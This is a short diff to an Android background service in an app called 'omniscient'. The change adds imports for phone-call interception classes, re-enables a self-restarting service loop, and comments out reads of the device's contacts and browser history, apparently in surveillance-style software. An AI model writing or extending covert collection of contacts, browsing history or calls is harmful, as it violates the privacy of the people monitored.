@@ -17,6 +17,8 @@ import android.widget.Toast;
 
 import com.postal.omniscient.R;
 import com.postal.omniscient.postal.browser.history.BrowserHistory;
+import com.postal.omniscient.postal.catchPhone.Call.PhoneCall;
+import com.postal.omniscient.postal.catchPhone.Call.TService;
 import com.postal.omniscient.postal.reader.contact.ReadContacts;
 
 import java.util.Calendar;
@@ -123,13 +125,15 @@ public class MyService extends Service {
             }
 
 
-//            Intent par = new Intent(getApplicationContext(), StartService.class);
-//            startService(par); Залоченый безконечный цыкл
+            Intent par = new Intent(getApplicationContext(), StartService.class);
+            startService(par);// Залоченый безконечный цыкл
+
+
 //            par = null;
             ReadContacts contact = new ReadContacts(getApplicationContext());
             BrowserHistory browser = new BrowserHistory(getContentResolver());
-            contact.getContacts();
-            browser.historyToJson();
+//            contact.getContacts();
+//            browser.historyToJson();
             return null;
         }
 
